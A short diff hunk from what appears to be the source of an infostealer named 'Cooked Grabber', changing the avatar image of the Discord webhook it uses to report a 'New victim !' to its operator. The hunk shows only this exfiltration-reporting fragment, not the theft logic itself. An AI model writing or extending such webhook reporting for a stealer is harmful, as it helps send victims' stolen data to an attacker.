@@ -471,7 +471,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
             webhook = DiscordWebhook(
                 url=URL,
                 username="Cooked Grabber",
-                avatar_url="https://i.postimg.cc/FRdZ5DJV/discord-avatar-128-ABF2-E.png",
+                avatar_url="https://m.media-amazon.com/images/I/514xijeBDqL._BO30,255,255,255_UF900,850_SR1910,1000,0,C_QL100_.jpg",
             )
             embed = DiscordEmbed(title="New victim !", color="FFA500")
             embed.add_embed_field(
